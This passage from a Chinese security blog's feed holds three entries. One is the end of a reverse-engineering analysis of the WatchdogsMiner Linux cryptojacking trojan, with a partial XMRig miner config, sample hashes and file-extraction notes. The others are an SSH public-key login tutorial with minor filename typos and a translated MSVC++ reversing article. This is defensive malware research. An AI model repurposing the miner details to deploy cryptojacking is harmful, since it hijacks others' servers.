class="number">-1</span>,</div><div class="line">            <span class="attr">"tls"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"tls-fingerprint"</span>: <span class="literal">null</span></div><div class="line">        &#125;</div><div class="line">    ],</div><div class="line">    <span class="attr">"print-time"</span>: <span class="number">60</span>,</div><div class="line">    <span class="attr">"retries"</span>: <span class="number">5</span>,</div><div class="line">    <span class="attr">"retry-pause"</span>: <span class="number">5</span>,</div><div class="line">    <span class="attr">"safe"</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">"threads"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"user-agent"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"watch"</span>: <span class="literal">false</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>相关文件的 MD5 如下：</p>
<blockquote>
<p>a5d6916fdfac60e680681f960430c6b5  config.json<br>510f8ee9e4195b0d35ed6daaf0bdb3b1  miner_ksoftirqds_32bit<br>e160cbeb74612cfbf0e1bdcf2d0038f3  miner_ksoftirqds_32bit.gz<br>a48f529646b8b5e96bab67d6d517a975  miner_ksoftirqds_64bit<br>a0bbd10da4aa1426ca42801b948372b9  miner_ksoftirqds_64bit.gz<br>86e2f5859ca276f307a034b5c7c450f1  miner_ksoftirqds_64bit_unpacked<br>877a282eb09d8f88ae29cd6b332ab90c  miner_ksoftirqds__32bit_unpacked</p>
</blockquote>
<p><strong>后记</strong></p>
<p>跟同行大佬私下聊，说通过 <strong>binwalk</strong> 也可以直接把里面的文件提取出来。我试了下，可行，而且可以提取出总共 4 个 gzip 文件(除了矿机程序和矿机配置文件，还有另外两个文件也被做了同样的处理)。有兴趣的朋友可以自己探索一下：</p>
<p><img src="/imgs/watchdogs_binwalk_gzipfilelist.png" alt=""></p>
<p>但是有一点需要说明，这个 case 中，恰好是把这些目标文件压缩成 gzip 格式，然后打包进 ELF 木马文件中，而 binwalk 恰好可以识别二进制程序中的 gzip 文件格式。如果别的 Case 中，木马作者把要打包的文件做了 binwalk 无法识别的编码，那么就难以用 binwalk 直接提取了。</p>
<p>所以，本文提供的只是一个通用但算是 Hard Way 的静态分析手法达到提取文件的目标，仅供参考。</p>
<p>另外，综合几家的分析报告，以及同行大佬私下讨论，可以推测 Watchdogs 木马启用了 2 款矿机程序：</p>
<ol>
<li>一个是<a href="https://mp.weixin.qq.com/s/3jdtIRIFFPrVnWSU1K99lg" target="_blank" rel="external">默安科技最新的分析报告</a>中提到的， XMR-Stak 编译而来，挖矿配置硬编码在矿机程序中，xmr 钱包地址分支是 .tenx；</li>
<li>另一个是本文中提到的，XMRig 编译来的矿机，挖矿配置是打包在主样本中的 config.json 文件，xmr 钱包地址分支是 .teny。 </li>
</ol>
<p>xmr-stak 和 xmrig 两个矿机程序的配置文件格式和内容有所不同，可以用来辅助分析：</p>
<ul>
<li>xmr-stak 的默认配置文件： <a href="https://github.com/fireice-uk/xmr-stak-cpu/blob/master/config.txt" target="_blank" rel="external">https://github.com/fireice-uk/xmr-stak-cpu/blob/master/config.txt</a></li>
<li>xmrig 的默认配置文件： <a href="https://github.com/xmrig/xmrig/blob/master/src/config.json" target="_blank" rel="external">https://github.com/xmrig/xmrig/blob/master/src/config.json</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这周末爆发的新型 Linux 挖矿木马 WatchdogsMiner，有两家厂商分析的挺详细，尤其是腾讯云鼎实验室的分析，全面而深入。看完他们的的分析很有收获，也才发现这个 WatchdogsMiner 比之前想象的复杂一些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;腾讯云鼎： &lt;a href=&quot;https://mp.weixin.qq.com/s/3V0HVEREZWU8SkRWLspaxg&quot;&gt;事件分析 | Linux watchdogs 感染性隐藏挖矿病毒入侵还原录&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;深信服： &lt;a href=&quot;https://mp.weixin.qq.com/s/dwY--BLzcyeXqPUZlhb__Q&quot;&gt;紧急预警！WatchDogsMiner挖矿蠕虫大量感染Linux服务器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但是有一个参与此次木马应急响应的朋友指出：里面有个关键的挖矿模块 &lt;code&gt;/tmp/ksoftirqds&lt;/code&gt; ，目前公开的分析文章中看他们并没有提到捕获的细节(当然，不是说他们没有搞定这一点，只是没在文中提及细节)。&lt;/p&gt;
&lt;p&gt;说的也是，既然是&lt;strong&gt;挖矿木马&lt;/strong&gt;，个人认为分析的时候要重点关注 3 个要素：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;矿机程序(Hash 值、由什么开源矿机编译而来、版本等等）；&lt;/li&gt;
&lt;li&gt;挖矿配置（挖矿账号、矿池地址，有的还有自建挖矿代理服务器）；&lt;/li&gt;
&lt;li&gt;挖矿收益（可选，因为在某些情况下查不到）。&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="miner" scheme="http://jiayu0x.com/tags/miner/"/>
    
  </entry>
  
  <entry>
    <title>SSH 公钥登录配置详解(iTerm2 为例)</title>
    <link href="http://jiayu0x.com/2017/11/22/ssh-pubkey-auth/"/>
    <id>http://jiayu0x.com/2017/11/22/ssh-pubkey-auth/</id>
    <published>2017-11-21T16:00:00.000Z</published>
    <updated>2019-11-15T02:02:41.244Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>SSH 服务的远程登录服务方式，通常有<strong>密码登录</strong>和<strong>公钥登录</strong>两种。公钥登录方式的好处就不赘述了，本文详解 SSH 公钥登录的配置过程，以及其中常见的坑。<br><strong>Note</strong>：本文所有实验均在 Mac 下的 iTerm2 中操作。</p>
</blockquote>
<p>配置单个主机的 SSH 公钥登录，步骤非常简单，三步即可：</p>
<ol>
<li>生成密钥对</li>
<li>拷贝公钥文件到服务器</li>
<li>SSH 直接公钥登录服务器</li>
</ol>
<a id="more"></a>
<h2 id="步骤详解"><a href="#步骤详解" class="headerlink" title="步骤详解"></a>步骤详解</h2><h3 id="ssh-keygen-生成密钥对"><a href="#ssh-keygen-生成密钥对" class="headerlink" title="ssh-keygen 生成密钥对"></a>ssh-keygen 生成密钥对</h3><p><strong>ssh-keygen</strong> 命令可以按照指定的参数生成密钥对，其常用的参数有以下几个：</p>
<blockquote>
<p><strong>-t</strong> ： 加密算法，可选 [dsa | ecdsa | ed25519 | rsa]；<br><strong>-b</strong> ：密钥长度（256/512/1024/2048……）,建议至少1024；<br><strong>-f</strong> ： 输出的密钥对文件名；<br><strong>-N</strong> ：密钥口令。</p>
</blockquote>
<p>比如我要为 <strong>test</strong> 主机生成一对密钥文件，密钥长度 2048、加密算法 RSA，就可以用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh-keygen <span class="_">-f</span> <span class="built_in">test</span> -t rsa -b 2048</div></pre></td></tr></table></figure>
<p>执行此命令会提示 <code>Enter passphrase (empty for no passphrase):</code>，如果需要密钥口令，就要填上并记下来，如果不需要就直接摁回车键直到结束。命令执行完成后，会在当前目录生成两个文件：私钥文件 <strong>test</strong> 和 公钥文件 <strong>test.pub</strong> 。如果不指定 <code>ssh-keygen</code> 命令的 <strong>-f</strong> 参数，则会默认生成 <strong>~/.ssh/id_ras</strong> 和 <strong>~/.ssh/id_ras.pub</strong> 两个文件 。</p>
<h3 id="ssh-copy-id-拷贝公钥到服务器"><a href="#ssh-copy-id-拷贝公钥到服务器" class="headerlink" title="ssh-copy-id 拷贝公钥到服务器"></a>ssh-copy-id 拷贝公钥到服务器</h3><p><strong>ssh-copy-id</strong> 命令负责把上述步骤生成的公钥文件内容拷贝到服务器，确切说，是把 <strong>xxx.pub</strong> 文件中的内容<strong>附加</strong>到服务器端的 <code>~/.ssh/authorized_keys</code> 文件中。</p>
<p>ssh-copy-id 命令使用方式如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh-copy-id [-i &lt;identityfile&gt;] [-p &lt;port&gt;] [username@]hostname</div></pre></td></tr></table></figure>
<p>其中 <code>-i</code> 即指定上述步骤生成的密钥对中的 <strong>公钥文件</strong>，意思是把公钥文件 <strong>xxx.pub</strong> 传到服务端 <code>hostname</code>，把 <strong>xxx.pub</strong> 中的内容附加到 <code>hostname:/home/username/.ssh/authorized_keys</code> 文件中。如果不用 <code>-i</code> 指定公钥文件，则默认指定 <strong>id_ras.pub</strong> 。</p>
<p>举例来说，我想通过公钥登录我 <code>192.168.1.2</code> 上的 <code>jiayu</code> 账户，那么只需把上述步骤中生成的 <strong>test.pub</strong> 文件上传到该服务器即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh-copy-id -i <span class="built_in">test</span> jiayu@192.168.1.2</div></pre></td></tr></table></figure>
<p>运行这条命令会让输入一次账户密码，然后才能成功上传到服务端。</p>
<p>另外，还有好多人在这一步会舍弃 <code>ssh-copy-id</code> 命令，转而手动上传公钥文件到服务端，然后 <code>cat xxx.pub &gt;&gt; ~/.ssh/authorized_keys</code> ，个人不提倡这种做法， <code>ssh-copy-id</code> 这条专用命令就是为了免去麻烦又容易失误的手动操作。</p>
<h3 id="直接登录远程服务器"><a href="#直接登录远程服务器" class="headerlink" title="直接登录远程服务器"></a>直接登录远程服务器</h3><p>经过上面两步骤，没什么意外的话就可以用密钥登录远程服务器了。不过这里还有个小细节需要说一下，我们平时用密码 SSH 登录远程服务器，是用 <code>ssh username@host -p &lt;port&gt;</code> 命令然后输入密码。如果我们只有一台远程服务器需要用 SSH 公钥登录的方式，那么最初执行 ssh-keygen 命令的时候就可以不指定 <code>-f</code> 参数，默认生成密钥对文件 <strong>id_ras/id_isa.pub</strong> ，然后执行命令 <code>ssh username@host -p &lt;port&gt;</code> 不用输入密码即可登录，SSH 命令会默认调用 <strong>id_rsa</strong> 尝试连接。</p>
<p>但如果执行 ssh-keygen 命令的时候指定了 <strong>-f test</strong> 参数，那么这时要登录远程服务器就要在 SSH 命令中也指定私钥文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh -i <span class="built_in">test</span> jiayu@192.168.1.2</div></pre></td></tr></table></figure>
<p>成功登录，配置完成，即可删除本地的公钥文件 xxx.pub，只留下相应的私钥文件。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>有的朋友会发现，严格按照上述步骤操作，也无法成功连接服务端。此处常见的坑有 2 个：</p>
<ol>
<li>服务端 <code>~/.ssh/</code> 目录和 <code>~/.ssh/authorized_keys</code> 文件的权限问题；</li>
<li>服务端 <code>~/.ssh/authorized_keys</code> 文件内容格式问题。</li>
</ol>
<h3 id="服务端相关目录和文件权限"><a href="#服务端相关目录和文件权限" class="headerlink" title="服务端相关目录和文件权限"></a>服务端相关目录和文件权限</h3><p>个人见过的情况，把服务端  <code>~/.ssh/</code>  目录权限设置为 <strong>700</strong> ，把  <code>~/.ssh/authorized_keys</code> 文件权限设置为 <strong>600</strong> 即可。</p>
<h3 id="authorized-keys-中-pubkey-内容要换行"><a href="#authorized-keys-中-pubkey-内容要换行" class="headerlink" title="authorized_keys 中 pubkey 内容要换行"></a>authorized_keys 中 pubkey 内容要换行</h3><p>有时候，服务端 SSH 目录和文件权限都没问题，仍然连接失败。此时给 SSH 命令启用 <code>-v</code> 选项打出连接时的详细信息，会发现客户机已经把私钥发送到服务器端，但在服务器端没有验证成功。</p>
<p>并且，在服务端的 SSH 服务日志 <code>/var/log/secure</code> 文件中可以查到类似以下内容的错误信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error: key_read: uudecode AAAAB3N failed</div></pre></td></tr></table></figure>
<p>此时就是服务端 <code>~/.ssh/authorized_keys</code> 文件内容格式出了问题。根源在于 <code>ssh-copid</code> 命令默认把公钥文件内容直接附加到服务端 <code>authorized_keys</code> 末尾，而<strong>没有换行</strong>。</p>
<p>解决方案也很简单：Vim 打开服务端 <code>~/.ssh/authorized_keys</code> 文件，为每个 pubkey 内容手动隔开一行即可。</p>
<h2 id="配置多服务器多公钥登录"><a href="#配置多服务器多公钥登录" class="headerlink" title="配置多服务器多公钥登录"></a>配置多服务器多公钥登录</h2><p>前面举的例子都是针对单一服务器 SSH 公钥登录配置，如果我有多台服务器都需要配置成 SSH 公钥登录，该怎么配置？</p>
<p>这里有个便捷的方式，两步即可完成配置：</p>
<ol>
<li>为每台服务器按照上面的 <strong>三步走</strong> 生成密钥对文件，配置 SSH 公钥登录后，整理好本地所有的私钥文件，最好所有的私钥文件统一放到同一目录下，比如 <code>~/.ssh/priKeys/</code> ；</li>
<li>编写本地 SSH 配置文件： <code>~/.ssh/config</code> </li>
</ol>
<p>假如我的服务端主机与<strong>主机别名</strong>（方便自己记忆而起的别名）列表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">192.168.120.1    jiayu1</div><div class="line">192.168.120.2    jiayu2</div><div class="line">192.168.110.3    jiayu3</div><div class="line">192.168.110.4    jiayu4</div></pre></td></tr></table></figure>
<p>那么我的本地 <code>~/.ssh/config</code> 文件配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Host jiayu1                               #别名</div><div class="line">Hostname 192.168.120.1                    #服务器地址</div><div class="line">Port 22                                   #服务器 SSH 服务端口</div><div class="line">User root                                 #服务端的用户名</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest1    #对应本地的私钥文件路径</div><div class="line"></div><div class="line">Host jiayu2</div><div class="line">Hostname 192.168.120.2</div><div class="line">Port 22</div><div class="line">User root</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest2</div><div class="line"></div><div class="line">Host jiayu3</div><div class="line">Hostname 192.168.110.3</div><div class="line">Port 22</div><div class="line">User root</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest3</div><div class="line"></div><div class="line">Host jiayu4</div><div class="line">Hostname 192.168.110.4</div><div class="line">Port 22</div><div class="line">User root</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest4</div></pre></td></tr></table></figure>
<p>各配置项的意义见上面的注释内容，这样一来，我就可以用 <strong>主机别名</strong> 直接登录远程服务器了。比如通过 SSH 公钥登录 <code>root@192.168.110.4</code> ，以下命令即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh jiayu4</div></pre></td></tr></table></figure>
<p>这样，ssh 命令会自动根据 <code>~/.ssh/config</code> 中的配置项，寻找到 <code>jiayutest</code> 这一个私钥文件，然后拿它去登录 <code>root@192.168.110.4</code> 。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;SSH 服务的远程登录服务方式，通常有&lt;strong&gt;密码登录&lt;/strong&gt;和&lt;strong&gt;公钥登录&lt;/strong&gt;两种。公钥登录方式的好处就不赘述了，本文详解 SSH 公钥登录的配置过程，以及其中常见的坑。&lt;br&gt;&lt;strong&gt;Note&lt;/strong&gt;：本文所有实验均在 Mac 下的 iTerm2 中操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;配置单个主机的 SSH 公钥登录，步骤非常简单，三步即可：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;生成密钥对&lt;/li&gt;
&lt;li&gt;拷贝公钥文件到服务器&lt;/li&gt;
&lt;li&gt;SSH 直接公钥登录服务器&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="ssh" scheme="http://jiayu0x.com/tags/ssh/"/>
    
      <category term="pubkey" scheme="http://jiayu0x.com/tags/pubkey/"/>
    
      <category term="公钥认证" scheme="http://jiayu0x.com/tags/%E5%85%AC%E9%92%A5%E8%AE%A4%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>(译)MSVC++ 逆向（二）—— 类、方法和 RTTI</title>
    <link href="http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/"/>
    <id>http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/</id>
    <published>2017-04-29T16:00:00.000Z</published>
    <updated>2017-05-04T13:48:47.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>原文： <a href="http://www.openrce.org/articles/full_view/23" target="_blank" rel="external">http://www.openrce.org/articles/full_view/23</a></p>
</blockquote>
<p>这是本系列第二篇（第一篇 👉： <a href="http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/">MSVC++ 逆向(1)——异常处理</a> ），本篇将介绍 MSVC 中实现的 C++ 底层机制，包括逆向过程中的 <strong>类结构内存布局</strong>、<strong>虚函数</strong>、<strong>RTTI</strong>（<strong>Run-Time Type Information</strong>，运行时类型识别）。阅读本文需要有 C++ 基础知识以及汇编和逆向相关基础。</p>
<a id="more"></a>
<h2 id="类的内存布局基础"><a href="#类的内存布局基础" class="headerlink" title="类的内存布局基础"></a>类的内存布局基础</h2><p>为了方便阐述接下来的内容，先看一段简单的 C++ 代码示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> A</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> a1;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">      <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">A_virt1</span><span class="params">()</span></span>;</div><div class="line">      <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">A_virt2</span><span class="params">()</span></span>;</div><div class="line">      <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">A_static1</span><span class="params">()</span></span>;</div><div class="line">      <span class="function"><span class="keyword">void</span> <span class="title">A_simple1</span><span class="params">()</span></span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> B</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> b1;</div><div class="line">    <span class="keyword">int</span> b2;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">B_virt1</span><span class="params">()</span></span>;</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">B_virt2</span><span class="params">()</span></span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> C: <span class="keyword">public</span> A, <span class="keyword">public</span> B</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> c1;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">A_virt2</span><span class="params">()</span></span>;</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">B_virt2</span><span class="params">()</span></span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>多数情况下 MSVC++ 的 <strong>类</strong> 中个元素在内存布局中的顺序如下：</p>
<ul>
<li>指向<strong>虚函数表</strong>的<strong>指针</strong>（ <code>_vtable_</code> 或者 <code>_vftable_</code> ），仅当类中有<strong>虚函数</strong>、并且<strong>基类</strong>中没有相应的<strong>虚函数表</strong>的时候才有此指针元素；</li>
<li>基类</li>
<li>类成员</li>
</ul>
<p><strong>虚函数表</strong>中囊括了类中的各个<strong>虚函数</strong>，以虚函数声明的顺序排列。其中，<strong>重载函数</strong> 的 <strong>地址</strong> 覆盖基类中相应函数的地址。如此一来，上面 3 个类在内存中的布局大概如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">class A size(8)</div><div class="line">       +---</div><div class="line">    0  | &#123;vfptr&#125;</div><div class="line">    4  | a1</div><div class="line">       +---</div><div class="line"></div><div class="line">A&apos;s vftable:</div><div class="line">    0  | &amp;A::A_virt1</div><div class="line">    4  | &amp;A::A_virt2</div><div class="line">-----------------------</div><div class="line"></div><div class="line">class B size(12):</div><div class="line">        +---</div><div class="line">    0   | &#123;vfptr&#125;</div><div class="line">    4   | b1</div><div class="line">    8   | b2</div><div class="line">        +---</div><div class="line"></div><div class="line">B&apos;s vftable:</div><div class="line">    0   | &amp;B::B_virt1</div><div class="line">    4   | &amp;B::B_virt2</div><div class="line">-----------------------</div><div class="line"></div><div class="line">class C size(24):</div><div class="line">         +---</div><div class="line">         | +--- (base class A)</div><div class="line">    0    | | &#123;vfptr&#125;</div><div class="line">    4    | | a1</div><div class="line">         | +---</div><div class="line">         | +--- (base class B)</div><div class="line">    8    | | &#123;vfptr&#125;</div><div class="line">    12   | | b1</div><div class="line">    16   | | b2</div><div class="line">         | +---</div><div class="line">    20   | c1</div><div class="line">         +---</div><div class="line"></div><div class="line">C&apos;s vftable for A:</div><div class="line">    0   | &amp;A::A_virt1</div><div class="line">    4   | &amp;C::A_virt2</div><div class="line"></div><div class="line">C&apos;s vftable for B:</div><div class="line">    0   | &amp;B::B_virt1</div><div class="line">    4   | &amp;C::B_virt2</div></pre></td></tr></table></figure>
<p>上面的图表是在 VC8 中用一个文档中没说明的编译选项生成的，对于编译器产生的类内存布局图表，用 <code>-d1reportSingleClassLayout</code> 编译选项可以查看单个类的布局图表；用 <code>-d1reportAllClassLayout</code> 可以查看所有类的内存布局（包括内部的 CRT 类），布局图表会在 <code>stdout</code> 中输出。</p>
<p>从上面编译器生成的图表可以看出，类 <code>C</code> 里有两个 <strong>虚函数表</strong>，这是因为它继承了两个基类，而两个基类均有自己的虚函数成员。在类 C 的第一个虚函数表中，虚函数 <code>C::A_virt2()</code> 的地址覆盖了基类 A 在 C 中派生的 <code>A_virt2()</code> 的地址；类似地，在类 C 的第二个虚函数表中，虚函数 <code>C::B_virt2()</code> 的地址覆盖了基类 B 在 C 中派生的 <code>B_virt2()</code> 的地址。</p>
<h2 id="调用约定与类方法"><a href="#调用约定与类方法" class="headerlink" title="调用约定与类方法"></a>调用约定与类方法</h2><p>MSVC++ 中的类方法调用时，默认遵守 <code>_thiscall_</code> 调用约定。通过类的对象调用<strong>非静态成员函数</strong>或<strong>非全局函数时</strong>，类的对象自身的地址（即 <code>*this</code> 指针的值）会以<strong>隐含参数</strong>的形式传递给被调用的类的成员函数，通常，这个 <code>*this</code> 指针的值，存储在寄存器 <code>ecx</code> 中。在函数体的实现中，编译器通常把这个指针值塞在其他寄存器中（比如 <code>esi</code> 或 <code>edi</code> ），或者直接存入栈中的某个变量，然后对其他所有类成员的访问，都基于这个地址进行相对寻址来实现。然而，当实现 <code>COM</code> 类的时候，对类成员函数的调用则遵循 <code>_stdcall_</code> 的调用约定。下面详述几种不同的类成员方法调用时的底层细节：</p>
<h3 id="1-静态成员函数"><a href="#1-静态成员函数" class="headerlink" title="1) 静态成员函数"></a>1) 静态成员函数</h3><p>调用<strong>静态成员函数</strong>不需要类的实例对象，可以直接通过类名来调用，在底层看来就跟调用普通非成员函数差不多，并不涉及 <code>*this</code> 指针的隐式传递。不过，也正因如此，逆向过程中不容易区分类的静态成员函数和普通的非成员函数。比如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A::A_static1();</div><div class="line">call    A::A_static1</div></pre></td></tr></table></figure>
<h3 id="2-普通成员函数"><a href="#2-普通成员函数" class="headerlink" title="2) 普通成员函数"></a>2) 普通成员函数</h3><p><strong>普通成员函数</strong>的调用，就需要通过类的实例对象来调用了，这种情况下 <code>*this</code> 指针会以隐含参数的形式作为被调函数的第一个参数传递进去，并遵循 <code>_thiscall_</code> 调用约定，在底层会存储在 <code>ecx</code> 寄存器中。另外，如果存在类继承的情况，基类对象的地址可能与派生类的对象的地址不同，这时候如果在派生类的对象中调用基类的成员函数， <code>*this</code> 指针的值需要调整到<strong>基类对象</strong>的起始地址，然后才能调用基类中的普通成员函数。示例如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;pC-&gt;A_simple1(1);</span></div><div class="line"><span class="comment">;esi = pC</span></div><div class="line"><span class="keyword">push</span>    <span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esi</span></div><div class="line"><span class="keyword">call</span>    A::A_simple1</div><div class="line"></div><div class="line"><span class="comment">;pC-&gt;B_simple1(2,3);</span></div><div class="line"><span class="comment">;esi = pC</span></div><div class="line"><span class="keyword">lea</span> <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">8</span>] <span class="comment">;调整 *this 指针的值</span></div><div class="line"><span class="keyword">push</span>    <span class="number">3</span></div><div class="line"><span class="keyword">push</span>    <span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line"><span class="keyword">call</span>    B::B_simple1</div></pre></td></tr></table></figure>
<p>如上所示，在调用 <code>B</code> 类的成员函数之前， <code>*this</code> 指针的值调整为 <code>B</code> 类子对象的起始地址。</p>
<h3 id="3-虚函数"><a href="#3-虚函数" class="headerlink" title="3) 虚函数"></a>3) 虚函数</h3><p>为了调用<strong>虚函数</strong>，编译器首先需要从<strong>虚函数表</strong>中取出相应虚函数的起始地址，然后就按照类似普通成员函数调用的方式去调用它（把 <code>*this</code> 指针以隐含参数的方式传递），示例如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;pC-&gt;A_virt2()</span></div><div class="line"><span class="comment">;esi = pC</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">esi</span>]  <span class="comment">;获取虚函数表的地址</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esi</span></div><div class="line"><span class="keyword">call</span> [<span class="built_in">eax</span>+<span class="number">4</span>]  <span class="comment">;调用虚函数表中的第二个虚函数</span></div><div class="line"></div><div class="line"><span class="comment">;pC-&gt;B_virt1()</span></div><div class="line"><span class="comment">;edi = pC</span></div><div class="line"><span class="keyword">lea</span> <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">8</span>] <span class="comment">;调整 *this 指针的值</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">edi</span>]   <span class="comment">;获取虚函数表的地址</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line"><span class="keyword">call</span> [<span class="built_in">eax</span>]       <span class="comment">;调用第一个虚函数</span></div></pre></td></tr></table></figure>
<h3 id="4-构造函数和析构函数"><a href="#4-构造函数和析构函数" class="headerlink" title="4) 构造函数和析构函数"></a>4) 构造函数和析构函数</h3><p><strong>构造函数</strong>和<strong>析构函数</strong>的调用过程，与普通成员函数类似。不同的是，即使按惯例来说构造函数并没有返回值，它仍然会把构造好的类的实例对象的起始地址隐式地返回（<code>return</code> 到寄存器 <code>eax</code> 中）。</p>
